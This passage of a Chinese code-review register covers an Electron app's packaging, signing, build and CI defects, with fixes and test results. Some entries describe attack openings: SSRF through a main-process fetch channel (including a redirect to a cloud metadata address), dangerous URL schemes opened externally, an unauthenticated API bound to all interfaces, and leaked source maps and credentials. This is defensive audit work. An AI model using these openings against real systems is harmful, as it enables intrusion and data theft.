| REV-323 | 低 | 死 IPC 频道 | `electron/preload.ts:96-99`、`ipcBridge.ts:564,578` ↔ `todoStore.ts:92,147`、`ipcApi.ts`（无 todos 封装） | `ipc-get-todos`/`ipc-clear-todos` 已注册并暴露但前端零调用，计划面板仍走本机 HTTP → 桌面形态白白承担限流风险（与 REV-314 相互放大）→ 加 IPC 优先路径或删频道 | △子代理 |
| REV-324 | 中 | 数据白流（汇总） | 见清单 A 全部位置 | 后端 30+ 类事件（治理/审计/监管/A2A/仲裁/memory）在事件总线上发出后**前端零消费**，对应业务只在被轮询的 REST 里可见 → 治理域既产生事件流又依赖轮询，双写口径易分叉，且 `ai_events` 表体积被无消费者事件撑大 → 修复时先定「事件优先还是 REST 优先」的单一口径（与 REV-09x 治理大屏伪造、REV-268 伪造案件为同一决策） | △子代理 |

#### M11 契约视角已核对为干净的点

- 34 个 `ipc-*` 频道在 `ipcBridge`/`onboardingIpc` 的注册与 `preload` 暴露**一一对应**，无拼写漂移（唯一「暴露未注册」是主进程 push 用的 `backend-event`）。
- 前端 30 个 `/api/*` 路径字符串与 `routes.ts` 各 `*Api` 注册全部命中；`webServer.ts:45-48` 正确剥离 query；`?agentId=`/`?status=all`/`?archived=all` 的方法与参数名两端一致。
- 分页与单位口径一致：memory entries 50/cap 200、long-term 1000/cap 5000、stats-events 500/cap 2000 双端相同；时间戳与 `since` 全链路毫秒。
- `TransactionType` 枚举与前端色表同 `Src/Services/TokenEconomy/types.ts:10-21` 完全对齐（注意：这与 REV-270 的桑基图比例伪造是两件事）。

---

## 15. Bug 登记表（M12 构建 / 运行形态 / 打包 / 发布）

来源子代理：`M12-Packaging`（electron-builder 配置、签名与发布脚本、`release/` 实物）、`M12-Front`（`Client/` 构建与静态托管）、`M12-Backend`（`package.json` scripts、CI、运行形态与关闭序列）。**本切片不执行任何构建/打包/签名命令**，实物结论均来自只读 `ls`/`unzip -l`/文件读取。

### 15.1 打包、签名与发布（REV-278~289）

| REV | 严重 | 维度 | 证据（file:line） | 现象 → 影响 → 修复方向 | 状态 |
|---|---|---|---|---|---|
| REV-278 | 高 | 安全/敏感物进包 | `package.json:59`、`:68-75`；`.gitignore:36`；`Src/Infra/Fs/pathResolver.ts:196-199` | `files` 用 `Configs/**/*` 且 `extraResources` 整目录搬运，**不排除 `local.json` / `.env*`**；开发态 `configDir` 即仓库 `Configs/`，引导流程写出的 `Configs/local.json`（内含 API Key）被 `.gitignore` 隐藏 → 打包机上若存在则静随 Setup/Portable 分发给所有用户，并明文落在 asar 之外。当前仓库确认无该文件（属潜伏态；已核对 `Configs/*.json` 全为 `api_key_ref: "env:…"`）→ `files` 增 `!Configs/local.json`/`!.env*`，并在 `package.cjs` 预检加敏感文件扫描门禁 | ✅复核（glob 与 .gitignore）/ ✅已修复(P0-3 2026-10-08，正反双向实测：撤护栏→假凭据进 asar+明文目录；加护栏→1158 条目内无 local.json，详见 §16.9) |
| REV-279 | 高 | 发布/更新链 | `release/win-unpacked/resources/app-update.yml:1-7`；`package.json:50-135` | 产物内更新源硬编码 `provider: github / owner: linmowudie / repo: CivitasAI / publisherName: [Ma Hongyu (Self-Signed)]`，而 `package.json` 无 `publish` 段、依赖无 `electron-updater` → 发布权实际等于该 GitHub repo 写权限；自签主体进 `publisherName` 后，未安装本机根证书的用户上签名校验恒失败，自动更新整体失效；个人真实姓名随包外泄 → 正式 CA 或私有 feed；不用更新机制则删除该 yml | ✅复核 · ✅已修复(P0-3 2026-10-08)：根因校正——**不是陈旧产物**，仓库无 `publish` 段时 electron-builder 会从 git remote（`github.com/linmowudie/CivitasAI`）推断 publish，`publisherName` 取自签名证书主体，故每次打包都会重新生成该 yml。已设 `build.publish: null`（全仓无 `electron-updater`/`autoUpdater` 引用，更新链本就不存在），重打后 `resources/app-update.yml` 实测不再产出；`Scripts/verifyRelease.cjs` 把"出现未经配置的更新元数据"设为常设失败项并打印泄漏内容，`npm run package:check` 在修复前即以此项拦下旧包） |
| REV-280 | 高 | 默认暴露面 | `Configs/default.json:11`；`Src/main.ts:849`；`Src/Interface/WebServer/httpServer.ts:78-84` | 随包默认 `server.host="0.0.0.0"`，而 `/api/*` 只过 IP 限流、**无鉴权中间件**（见 REV-13x）→ 桌面端把会话、审批、密钥写入、MCP 控制面暴露到局域网；配合 REV-264/身份自报缺陷即等于同网段任意机器可审批 → 打包/桌面形态默认 `127.0.0.1`，`0.0.0.0` 需显式开启并告警。**已核对**：`default.json:11` 确为 `0.0.0.0`。**与 REV-001 为同一现象**（本条是打包/发布侧的默认配置证据），修复时并入 P0-2，不另立工单 · ✅已修复(P0-2 2026-10-08)：`Configs/default.json` 随包改为 `127.0.0.1`+`allowRemoteAccess:false`，非回环绑定改由 `bindPolicy.resolveBindHost()` 裁决——未显式授权即回退 `127.0.0.1` 并告警（不静默改用户意图），授权后保留并告警"等同暴露控制面"；真实后端实测从本机局域网 IP `10.44.81.114:3000` 访问不可达，改 `0.0.0.0` 后同址可达且仍 401 | ✅复核 · ✅已修复(P0-2 2026-10-08) |
| REV-281 | 高 | 签名门禁 | `Scripts/verifySign.ps1:101-105,145`；`package.json:45,108-126` | `$badTrust`（HashMismatch / 链断裂 / 过期）赋值后**全文未再引用**，`-Require` 分支只统计 `NotSigned`（`:104`）→ 校验失败的产物在 `-Require` 下照样打印「✅ 校验通过」（`:145`）并以 0 退出；`build.win` 未设 `forceCodeSigning` → 无证书时 electron-builder 仅 warn 即出包，`npm run package` 返回 0；`sign:verify` 脚本裸跑不带 `-Require` → 「缺证书降级为成功」在三层同时成立 → 让 `$badTrust` 真正参与判定、开启 `forceCodeSigning`、CI 用 `-Require`。**已核对**：`verifySign.ps1:101-105` 确为死变量，`package.json` build 段确无 `forceCodeSigning` | ✅复核 · ✅已修复(P0-3 2026-10-08)：`verifySign.ps1` 改为按文件汇总的三档判定（已签名但校验不通过 = **无条件**失败；未签名 = `Require`/`RequireTrusted` 下失败；链不可信 `UnknownError/NotTrusted/TrustError` = 仅 `RequireTrusted` 下失败），并把判定理由写进汇总表列；`build.win.forceCodeSigning=true`；`package.cjs` 预检自动采用 `sign:setup` 产出的本机自签证书（`CSC_LINK`/`CSC_KEY_PASSWORD` 注入子进程，密码不落日志），无证书且未加 `--allow-unsigned` 时在长时间构建**之前**即失败。**实测**：把已签名 exe 篡改 1 字节 → 状态 `HashMismatch`，**不带 `-Require` 也 exit 1**（旧实现此处绿灯通过）；现存 233KB 未签名安装包在 `-Require` 下 exit 1） |
| REV-282 | 高 | 产物真实性 | `Scripts/verifyPackage.cjs:26-28,31-62`；`package.cjs:480-485` | 名为「打包产物校验器」却只检查 `dist/**` 与 `assets/**` 的文件存在性，对 `release/` 里的真实安装包**零校验**；`--stage=post` 只改标题文案 → 一键打包的第 7/7 步「产物校验通过」是假绿灯（见 REV-283 的坏包实例）→ 校验对象改为 `release/` 安装包本体（解包后核对 main 入口、asar 头、native binding） | △子代理 · ✅已修复(P0-3 2026-10-08)：新增 `Scripts/verifyRelease.cjs`（`npm run package:verify`）做**内容级**校验——主程序 exe 体积下限、asar 内四个入口、包内 `index.html` 逐个引用资源、`.map`、凭据/私钥泄漏面（asar + `resources/app` 明文目录双扫）、`app.asar.unpacked` 内的 `.node`（且必须含 better-sqlite3）、未经配置的 `app-update.yml`；`package.cjs` 的 `--check` 不再只看 `dist/`，同时核验现有 `release/` 产物。**实测**：旧包在 `--check` 下由 6 条断言中的 2 条判失败（`app-update.yml` 泄漏 + 体积），exit=1；负向用例（缺引用资源/夹带 .map/两处 local.json 泄漏/无 unpacked binding）5 项全部命中，exit=1） |
| REV-283 | 中 | 坏包实况 | `release/` 目录实物；`package.cjs:379` | `CivitasAI-Setup-0.1.0.exe` 仅 **233,042 B**，同目录遗留 `civitas-ai-0.1.0-x64.nsis.7z`（109,590,009 B）与 `…__uninstaller.exe`（191,251 B），且 `latest.yml` 已发布这个 233KB 文件的 sha512 → NSIS 未把应用包内联进 stub，**安装形态装完即无主程序**（`win-unpacked`/portable 可首启）；`package.cjs:379` 的体积下限本应拦下，说明该步未生效或被跳过 → 重新出包并复现体积门禁。**已核对**：`ls -l release/` 实测 233,042 B 与 109,590,009 B | ✅复核 · ✅已修复(P0-3 2026-10-08)：真实重打 `node Scripts/package.cjs --nsis --skip-build --skip-tests --no-probe` → exit 0（3 分 31 秒），安装包由 **233,042 B** 变为 **110,252,504 B（105.1 MB）**，SHA256 `55b1f2a780ac296d…a7c70d0b`，`verifyRelease` 八项内容断言全过（主程序 234.7 MB / asar 15.5 MB / 四入口齐全 / 包内入口引用 8 个资源 / 无 `.map` / 无凭据泄漏面 / 8 个 `.node` 含 better-sqlite3 / 不产出 `app-update.yml`），`verifySign -Require` 三件产物均 `Valid`（自签主体，证书至 2031-10-06，带时间戳）。旧的 233KB 壳此前已被 `--check` 判失败（见 REV-282）。**`latest.yml` 那半边也已闭合**：`build.publish:null` 后 electron-builder 不再生成该文件，实测遗留 yml 仍写着坏包的 sha512 而同名 exe 已被新包覆盖 → `reportArtifacts` 新增 `checkReleaseMetadata()` 逐字节核验，实测以「记录值 `kpP1tYZa…` ≠ 实际值 `hLzndWLh…`」exit 1 拦下，移除遗留元数据后 exit 0。安装后 GUI 首启仍需人工（§16.4） |
| REV-284 | 中 | 资源双份/路径漂移 | `electron/main.ts:105`；`package.json:56-90`；`Src/main.ts:861` | `CIVITAS_APP_ROOT` 指向 `resources/app`（extraResources 目录，仅 Configs/Prompts/Skills），asar 内另有一套同名副本 → asar 那份是纯死重；文档承诺 APP_ROOT 含 `assets/`、`dist/`，但 `app/` 下没有，于是 `join(getAppRoot(),'dist','renderer')` 在安装态恒不存在（实际靠 `loadFile(renderer/index.html)` 兜住）；未注入该 env 时 `pathResolver.ts:156` 会把含 `Configs/default.json` 的 `app.asar` 认作程序根，导致 dataRoot 落进只读 asar → `to:` 改为非保留名（如 `app-conf`）并从 `files` 去掉重复段 | △子代理 |
| REV-285 | 中 | 运行形态 | `electron/main.ts`（grep `requestSingleInstanceLock` 0 命中）；`httpServer.ts:100-103`；`electron/main.ts:359` | 未取单实例锁 → 二次启动时 `server.listen` EADDRINUSE → reject → `dialog.showErrorBox('启动失败')` + `app.quit()`，**第二个实例直接杀掉第一个用户的窗口**（用户视角：应用自己崩了）→ `app.requestSingleInstanceLock()` + `second-instance` 聚焦已有窗口 | △子代理 |
| REV-286 | 中 | IPC 越权/SSRF | `electron/main.ts:381-397` | `server-fetch` 把渲染进程传入的任意 `http(s)` URL 直接 `fetch`，无 host/端口白名单 → 渲染层一旦存在 XSS/注入面，即可借主进程发起内网请求（SSRF 绕过 CORS 与本地绑定假设）→ 限定 `127.0.0.1:${httpPort}`。**与 REV-002 同源**（本条为打包/主进程视角的补证），修复时并入 P0-2 | △子代理 · ✅已修复(P0-2 2026-10-08)：`server-fetch` 每次调用先过 `isAllowedServerFetchTarget`——只允许 `127.0.0.1:<后端端口>`，或渲染进程经 `set-account-server-origin` **显式钉住**的账号源（非回环必须 https 且逐字符比 origin）；`redirect:'manual'` 逐跳复检（≤5 跳），堵掉"合法源 302 到 169.254.169.254"的绕行；拒绝均打 `[Electron][security] server-fetch 拒绝` |
| REV-287 | 中 | 协议放行 | `electron/main.ts:241-244` vs `:438` | `setWindowOpenHandler` 将 `url` **原样**交给 `shell.openExternal`，缺少 `open-external` 通道里那条 `^https?://` 校验 → `file://`、`search-ms:`、`ms-msdt:` 等协议以用户权限拉起（同源不一致）→ 两处共用同一 scheme 白名单 | △子代理 · ✅已修复(P0-2 2026-10-08，与 REV-148 同源合并)：`setWindowOpenHandler`/`open-external` 统一走 `urlPolicy.isSafeExternalUrl` |
| REV-288 | 中 | 密钥落盘 | `Scripts/setupSelfSignedCert.ps1:53,155-165`；`packageSigned.cjs:96-100` | `pfxPassword` 以明文 `Set-Content` 写入 `signing.env.json`（无 DPAPI、无 ACL 收紧），默认证书主体硬编码个人姓名并入库；`packageSigned.cjs` 把证书绝对路径打印到 stdout（密码未打印，`.gitignore:28-33` 忽略项齐全，README/ELECTRON.md 未写口令 ✓）→ 改 DPAPI 或运行时读取 | △子代理 · ◐部分修复(P0-3 2026-10-08)：已改——默认 `-Subject` 从个人姓名改为 `CN=CivitasAI (Self-Signed)`（证书主体会经签名进 `publisherName`/更新元数据，属随包外泄的个人信息；已核对该脚本只在本机建证书、不入库，旧证书仍可用 `-Subject` 显式复用或 `-Force` 重签，实测当前 `.tmp/signing` 内的证书主体为 `Ma Hongyu (Self-Signed)`，未擅自作废用户已有凭据）。**未改**——`pfxPassword` 仍是明文写入 `.tmp/signing/signing.env.json`（DPAPI/运行时读取未做），归 P2-4；当前缓解：该文件在 `.gitignore:43` 的 `.tmp/` 内，`package.cjs` 只打印证书路径不打印密码，`build.files`/`extraResources` 已排除 `*.pfx/*.p12/*.pem/.env*`，`verifyRelease` 对 asar 与 `resources/app` 双扫实测零命中 |
| REV-289 | 低 | CI 发布盲区 | `.github/workflows/ci.yml:3-7,10,24,41,43` | CI 只有 ubuntu 的 lint/test/build，**无 windows / 打包 / 签名 job**，也没有 `release`/`tag`/`workflow_dispatch` 触发 → `npm run package` 全链从不在 CI 执行，REV-283 这类坏包无人发现；`:41` 把 JSON 数值插值进 shell 再插进 `node -e` 源码串，字段缺失时退化成 `if( < )` 语法错误 → 增加 windows package job + 安装包体积/内容门禁；PR 不上传构件（这点是干净的） | △子代理 |

### 15.2 前端构建产物与静态托管（REV-290~299）

| REV | 严重 | 维度 | 证据（file:line） | 现象 → 影响 → 修复方向 | 状态 |
|---|---|---|---|---|---|
| REV-290 | 高 | 构建可复现 | `package.json:12`；`Scripts/package.cjs:293-334,445`；`Scripts/install.sh:29` | `build:client` = `cd Client && npx vite build`，而全仓没有任何脚本安装 `Client/node_modules`（`install.sh:29` 只装根依赖；`package.cjs` 预检只查根目录的 electron-builder/electron）→ 干净工作区里 npx 静默拉取**最新未固定版本的 vite**，且 `@vitejs/plugin-react`、`@tailwindcss/vite` 缺失 → 打包失败或以错误 major 构建出「看起来成功」的产物 → 改 `npm run --prefix Client build`，预检加 `Client/node_modules/vite`。**已核对**：根 `package.json:11 build` 为 `tsc --noEmit && typecheck:electron`，不产出任何产物 | ✅复核（脚本层）/ △（干净环境复现） |
| REV-291 | 高 | 源码泄漏 | `Client/vite.config.ts:15-16`；`httpServer.ts:32-43,197`；`package.json:66` | `sourcemap: true` 无 mode 门控 → `dist/renderer/assets` 实测 **312 个 `.map`（约 17MB）**，`index-CVpjqtvg.js.map` 内含 `sourcesContent`（原始 TS 全文）。Electron 形态被 `!**/*.map` 挡住，但**浏览器/局域网形态**由 httpServer 直接托管，MIME 表无 `.map` → 以 octet-stream 照样可下载 → 前端源码全量外泄 → `sourcemap: mode!=='production'` + 服务端拒绝 `.map` 请求。**已核对**：`ls dist/renderer/assets/*.map` 计数为 312 | ✅复核 · ✅已修复(P0-3 2026-10-08)：三层同时收口——① 构建期：`Client/vite.config.ts` 改 `defineConfig(({mode})=>…)` 并设 `sourcemap: mode!=='production'`，production 重建后 `dist/renderer` 的 `.map` 实测 **312 → 0**（317 文件 / 12M）；② 运行时：`httpServer.ts` 在静态托管与 SPA 兜底**之前**拦 `.map`（`isSourceMapPath`），回 404 JSON + `logger.warn('源码映射请求被拒绝', {path, peer})`——放在兜底前是必要的，否则会被 SPA 降级成"200 + index.html"这种看不出问题的形态；③ 门禁期：`verifyClientDist.cjs` 与 `verifyRelease.cjs` 均把"产物/包内含 .map"判为失败。新增 `Tests/Interface/staticSourceMapDenial.spec.ts`（4 例全绿：小写 404 且不回 sourcesContent、大写 `.MAP` 404、正常 chunk 仍 200、未知路径仍走 SPA 兜底）） |
| REV-292 | 中 | 产物新鲜度 | `Src/main.ts:852-866`；`httpServer.ts:53,88`；`Client/vite.config.ts:13` | 默认 `staticDir=resolve('Client/dist')` 依赖 CWD，而 vite 输出在 `../dist/renderer`；`Client/dist` 是 2026-09-14 的化石产物（11MB，其 `index.html` 引用**绝对** `/assets/index-CNI_UZxH.js`，属 `base:'/'` 时代）→ 现靠 mtime 挑最新（`:860-865`），一旦解压/拷贝把化石时间戳刷新，就静默退回旧前端 + 绝对路径（file:// 与子路径部署直接 404）→ 删除化石目录、统一为单一常量 | △子代理（mtime 择新逻辑主代理已在 M08 核对） |
| REV-293 | 中 | 构建门禁 | `package.json:12`；`Client/package.json:8`；`tsconfig.json` include | 打包链走 `npx vite build`，绕开 Client 自身脚本 `tsc && vite build`；根 `tsc --noEmit` 的 include 只有 `Src/**` → **前端类型错误在整个发布链中零校验**，回归只能在运行时以白屏暴露（铁律 §3.2 的门禁侧）→ `build:client` 串 `tsc --noEmit -p Client/tsconfig.json` | △子代理 |
| REV-294 | 中 | 校验强度 | `Scripts/verifyClientDist.cjs:15-35`；`verifyPackage.cjs:48` | 校验仅 `stat(index.html) > 100 字节`：不检查其引用的 `./assets/*.js/css` 是否存在、不校验 chunk 数量、不校验是否夹带 `.map` → 半写产物只要入口尺寸正常即放行（`verifyPackage` 复用同一断言，与 REV-282 叠加成假绿灯）→ 解析 `index.html` 引用逐一存在性校验 | △子代理 · ✅已修复(P0-3 2026-10-08)：`verifyClientDist.cjs` 重写为逐项断言——① 入口存在且 ≥100 字节；② 解析 `index.html` 的每个 `./assets/*` 引用（`src`/`href`）并要求**逐个存在且非 0 字节**，引用数为 0 也判失败（入口被截断的形态）；③ `dist/renderer` 下任何 `.map`（含大写 `.MAP`）判失败；每项**只在自己通过时**打 ✅，失败打 ❌+建议，末尾统一 exit 1。修这版过程中还抓到一个输出缺陷：首稿把"✅ 引用的 8 个资源均存在"按引用条数打印，于是同一轮里 ✅ 与"❌ 有 1 个不存在"自相矛盾——现在该断言按实际存在性判定。**六个刻意构造的坏产物场景实测全部 exit 1**：chunk 缺失 / chunk 0 字节 / 注入 `.map` / 注入大写 `.MAP` / 入口 1 字节 / 入口完好但无资源引用；干净产物 exit 0。该脚本已同时挂在 `build:client` 收尾与 `package.cjs` 第 5 步） |
| REV-295 | 中 | 错误呈现/MIME | `httpServer.ts:87-88,197` | SPA fallback 对任意未命中路径回 `index.html`，包含 `/assets/*.js`：shiki 的 312 个懒加载 chunk 任一缺失时，浏览器收到 `text/html` 的模块请求 → 报「Expected a JavaScript module script but the server responded MIME type "text/html"」而非 404，白屏且极难定位；MIME 表另缺 `.mjs/.wasm/.webmanifest/.ttf/.otf/.webp` → 带扩展名的资源请求直接 404 | △子代理 |
| REV-296 | 中 | 门禁串联 | `Scripts/package.cjs:441-461`；`electron/main.ts:292` | 唯一能抓白屏的 DOM 断言（`[Electron][ui-debug]`，需 `CIVITAS_UI_DEBUG=1`）只存在于**手动的** `package:probe`；`package` / `electron:build` 收尾仅做 100 字节校验 → 「打包后能不能打开」从不被自动验证 → `--check` 后自动串一次 probe | △子代理 · ✅已修复(P0-3 2026-10-08)：`package.cjs` 第 8/8 步默认执行 `Scripts/probePackagedBackend.cjs`，失败即整链 exit 1；只有显式 `--no-probe` 才跳过，且跳过时打印「包内后端从未被真实拉起过」而不是伪装成通过。**实测**（对 00:01 新出的 NSIS `win-unpacked` 连跑两次均 exit 0）：包内后端以安装模式真实启动（随机端口 39301、数据根指向 `.tmp/probe-run` 沙箱），**26 个 GET 端点全 200**、`POST /api/sessions → 201`（返回 `session_id/title/status/created_at/work_dir`），渲染进程 DOM 断言取到非空白文本（`CIVITAS 智体城邦 · AI + 新任务 … 打包态探针会话`，root 子节点 2、尺寸 1400x868），后端业务日志 `Logs/business.log` 内 **ERROR/WARN 零条**（唯一报错是 Chromium `disk_cache … 拒绝访问 (0x5)`，另册 REV-327）。该链此前也在 `npm run package:dir` 全链内自动跑过一次（94 秒构建中的 25 秒即探针） |
| REV-297 | 低 | 依赖双份 | `Client/package.json:13-19` vs `package.json:171-177` | `react`/`react-dom`/`zustand`/`@types/react` 同时存在于根 devDeps（^19.3.0）与 Client deps（^19.1.0），实测两份物理拷贝（均解析到 19.3.0）；`vite` 亦双份（根 5.4.21 / Client 6.4.3）→ range 不重叠时，根 vitest 所测的 React ≠ 发布所用 React，且无 `overrides` 兜底 | △子代理 |
| REV-298 | 低 | 打包体积/目录冲突 | `package.json:60-62` vs `:68-89` | `Configs`/`Prompts`/`Skills` 既在 `files`（进 asar）又经 `extraResources` 落到 `resources/app/{...}`（实测两处都存在）→ 双份冗余，且 `resources/app` 是 Electron 应用目录的**保留候选名**，与 `app.asar` 并存目前只靠「asar 优先」的侥幸 → 同 REV-284 一并处置 | △子代理 |
| REV-299 | 低 | 外部依赖 | `Client/index.html:7-8` | `fonts.googleapis.com` 外链写死、vite 不打包 → 离线/内网环境渲染阻塞（render-blocking CSS），并与 CSP 收敛方向冲突（CSP 缺失本身已在 REV-163 登记，此处不重复）→ 本地化 `@fontsource` | △子代理 |

### 15.3 CI、脚本与运行形态（REV-300~311）

| REV | 严重 | 维度 | 证据（file:line） | 现象 → 影响 → 修复方向 | 状态 |
|---|---|---|---|---|---|
| REV-300 | 高 | 构建/CI | `.github/workflows/ci.yml:54`；`package.json:11` | `build` job 执行 `npm run build` = `tsc --noEmit && typecheck:electron`，**零产物、零 upload**；`dist/main`、`Client/dist`、安装包从不在 CI 生成 → CI 的「构建成功」仅代表类型检查通过，所有打包期错误（REV-290/292/293）只能本机暴露 | △子代理 |
| REV-301 | 高 | CI 恒红 | `ci.yml:35-41`；`vitest.config.ts:24` | vitest reporter 仅 `['text','json','html']`，无 `json-summary`，而门禁读取 `require('./coverage/coverage-summary.json')` → 必抛（本仓 `coverage/` 实测只有 `coverage-final.json`）→ test job 恒红，并连带 `needs: test` 的 build job 不执行 → reporter 补 `json-summary` | △子代理（coverage 目录实物由子代理 ls） |
| REV-302 | 高 | 发布门禁 | `Scripts/package.cjs:441-467`；`package.json:36` | 一键打包只做 esbuild（`Scripts/build.cjs:4` 自陈「不依赖严格类型检查」）+ 文件存在性校验，全链**无 tsc、无 test**；`electron:build`（`:36-37`）还是绕过 `verifyPackage` 的第二条发布路径 → 类型/测试回归可直达用户安装包 → `package.cjs` 增 typecheck+test 并收敛双路径 | △子代理 · ✅已修复(P0-3 2026-10-08)：`package.cjs` 新增第 2/8 步静态门禁——`npm run typecheck` → `npm run typecheck:electron` → `npx vitest run --exclude **/Tests/AgentRuntime/realAgent.spec.ts`，**任一失败即 `return 1`，位置在所有构建与 electron-builder 之前**（`package.cjs:669-681`）；双路径已收敛：`electron:build` → `node Scripts/package.cjs --portable`、`electron:build:dir` → `… --dir`，两条都走同一条含门禁的链，`package.json` 里不再有绕过 `verifyPackage` 的脚本；另加 `package:verify`（= `verifyRelease.cjs`）。**实测**：门禁三连全绿（两个 tsc 干净；149 文件 / 1783 用例通过，80.18s；`eslint Src/` 0 error / 314 warning 为既有基线）；负向用例——在 `Src/` 放一个 `const gateProbe: number = "…"` 的临时文件 → `npm run typecheck` **exit 2**（`Src/__gate_probe_tmp.ts(1,14): error TS2322`），即该命令失败会让整链在第 2 步中止，取证后临时文件已删除。**残留**：一次「不带 `--skip-tests`、含第 8 步探针」的完整链式运行需人工执行（本轮沙箱把 packaging 命令判为需显式授权，两次尝试均被拦截），故第 2 步"在流水线内被真实串联"目前是代码路径 + 命令级双向取证，而非一次端到端跑通 |
| REV-303 | 高 | 门禁盲区 | `package.json`（无 `workspaces`）、`:12`；`ci.yml:19` | `Client/`、`Server/` 各有独立 lockfile，根 `npm ci` 不安装其依赖 → 干净环境 `build:client` 不可复现（同 REV-290）；`Server/**`（src/test/migrations/vitest）不在任何门禁内：根 lint 只 `Src/`、根 tsc 的 tsconfig include 不含、根 vitest include 只 `Tests/` → 云服务端代码可随意回归 → 改 workspaces 或加 Client/Server job | △子代理 |
| REV-304 | 高 | 运行形态/关闭 | `Src/main.ts:885-888,907-988`；`electron/main.ts:522-535` | 9 步优雅关闭只挂在独立形态的 SIGINT；Electron 内嵌形态只有 `window-all-closed → stopServer()`（仅停 HTTP+IPC，无 `before-quit`）→ **打包/便携态永不执行** `closeDatabase`（WAL 不 checkpoint）、`shutdownLogger`、`stopAiEventPersistence`、`stopAutoScaling`、`purgeExpired`、在途流 abort → 关窗即可能丢尾部数据与日志（与 REV-22x「无 flush」同族）→ 把 9 步收进 `stopServer` 供两形态共用 | △子代理 |
| REV-305 | 中高 | 崩溃/信号 | `Src/main.ts:907,991-993` | 全仓（grep）只注册 SIGINT + `beforeExit`，无 `SIGTERM`/`uncaughtException`/`unhandledRejection`；且 `beforeExit` 调用 async `shutdownLogger` 却不 await → systemd/docker stop 与崩溃路径整段关闭逻辑被跳过，日志丢尾、异常无痕（与 REV-21x「无 crash handler」同一结论的后端侧证据）→ 补 SIGTERM 与两类 handler 走同一序列 | △子代理 |
| REV-306 | 中 | 引擎口径 | `package.json:5-8`；`Src/main.ts:151`；`pathResolver.ts:147`；`ci.yml:16` | 声明 `engines.node >=20.0.0`，但代码使用 `import.meta.dirname`（需 20.11）与 `process.loadEnvFile`（需 20.12）；devDeps 中 concurrently@10 需 ≥22、jsdom@30 需 ^22.22.2、electron@44 需 ≥22.12，CI 钉 Node 20 → Node 20.0~20.10 下 `findAppRoot` 静默回落 `cwd`（数据根错位、SQLite 落错位置），CI 上 devDep 违反 engines → engines 提至 `>=22.12` 并同步 CI | △子代理 |
| REV-307 | 中 | 死配置 | `tsconfig.build.json:4,12-22,24-27` | 唯一名为「生产构建」的 tsconfig **全仓零引用**，且 `strict`/`noUncheckedIndexedAccess` 等全关、`outDir` 与 esbuild 争抢 `dist/main`、include 含 `electron/**` → 谁执行 `tsc -p tsconfig.build.json` 就产出 `electron/main.js`（ESM），与 `package.json:6` 的 `main: dist/main/electron/main.cjs` 及 `build.cjs:11` 的 CJS 契约相违，产物启动即失败却无任何门禁可见 → 删除或改 NodeNext 并纳入门禁 | △子代理 |
| REV-308 | 中 | 门禁范围 | `package.json:15,30`；`tsconfig.json:49` | lint 仅 `Src/`；`Tests/**` 被 tsconfig exclude → 测试代码全仓不受 tsc（vitest 只剥类型）；`electron/**` 只 typecheck 不 lint；`Scripts/**`、`Server/**` 两者皆无 → 违规在 pre-commit 的 `\|\| true`（`:15`）下静默通过（铁律门禁侧的漏洞）→ 增 `lint:all`、Tests 纳入 tsconfig。**已核对**：`layer-check`（`:32`）无脚本/CI/husky 引用，与 M08 结论一致，不存在「以为分层被守护」的自动化依赖 | ✅复核（layer-check）/ △ |
| REV-309 | 中低 | 体积/新鲜度 | `package.json:131-134`；`package.cjs:373` | `asarUnpack` 用 `**/better-sqlite3/**/*` 无裁剪，asar 头实测含 darwin/linux/linuxmusl/win32-arm64 的 `.node`、`deps/sqlite3.c`（9.5MB）、C++ 源码与 `.vcxproj` 全量解包 → 安装体积虚增数十 MB；「产物早于本次打包」只 warn 不入 `problems` → 旧包被判成功（本地 `release/*.exe` 时间戳 10-08 00:06 比 `dist/main` 19:58 旧 20 小时即为此例）→ `files` 排除非 win32-x64 平台产物，不新鲜改为 fail | △子代理 |
| REV-310 | 中低 | 关闭序列（补强） | `Src/main.ts:287`；`Src/main.ts:1006` | 迁移失败会 `throw`（`:287`，正面），但独立/Electron 两形态的分支判断依赖 `if (!process.versions.electron)`（`:1006`）这类隐式约定，关闭与信号注册分散在两处 → 修复 REV-304/305 时应统一为单一 shutdown 入口，避免再次分叉（登记为结构性重构项，非独立缺陷） | △子代理 |
| REV-311 | 低 | 门禁假象 | `package.json:32` | `layer-check` 实为 no-op（无脚本/CI 引用，见 REV-308 复核），但文档多处宣称分层由其守护 → 团队可能据此认为 `Infra → Core` 反向依赖会被拦（真实门禁是 `npm run lint` 的 `import/no-restricted-paths`）→ 删除该脚本或改为真实校验，并在 `agent.md` 更正表述。**已核对**：无引用 | ✅复核 |

### 15.2/15.3 交叉说明

- `Configs/**/*`（REV-278）与 `Resources` 双份（REV-284/298）是同一段 `files` 配置的两处后果，修复时应一次性改写 `build.files`/`extraResources`。
- 「假绿灯」由四条独立成因叠成：`verifyPackage` 只查 `dist/**`（REV-282）+ `verifyClientDist` 只查入口字节（REV-294）+ 不新鲜仅 warn（REV-309）+ UI 探针不在门禁内（REV-296）。任一单独修复都不足以让发布门禁可信，须四条同批。
- 签名侧同理：`forceCodeSigning` 缺失（REV-281）与 `$badTrust` 未使用（REV-281 同行）+ CI 无 windows job（REV-289）= 未签名包可全程绿灯发布。

### 15.4 打包后能否首次启动（结论）

| 形态 | 判定 | 依据 |
|---|---|---|
| `release/win-unpacked` | ✅ 可首启 | asar 内 `dist/renderer` 与 `loadFile(__dirname/../../renderer/index.html)` 路径一致；`resources/app/Configs` 存在；better-sqlite3 走 N-API + `prebuilds/win32-x64.node` 已在 win-unpacked 内确认 |
| portable | ✅ 可首启 | 同上；`probePackagedBackend.cjs` 有实测断言 |
| **NSIS 安装形态** | ❌ **当前不能** | REV-283 的 233,042 B 空壳安装包，装完无主程序 |
| 首启数据目录 | ✅ 安全 | `nsis.perMachine:false` → 默认 `%LOCALAPPDATA%\Programs`；`electron/main.ts:128-158` userData 四级回落 + `pathResolver.ensureDirSafe` 不抛错；Workspace 不可写时自动回落 DATA_ROOT |

### 15.5 已核对为干净的点（M12，勿重复排查）

- 模块格式自洽：`"type":"module"` + `main: dist/main/electron/main.cjs` 一致；`electron/main.ts:47-49` 用变量间接 `import(specifier)`，确实阻止 esbuild 把后端内联进 17KB 主进程包；`build.cjs` 失败走 catch → `exit(1)`，`Scripts/**` 全域无 `|| true`（唯一例外是 pre-commit，见 REV-308）。
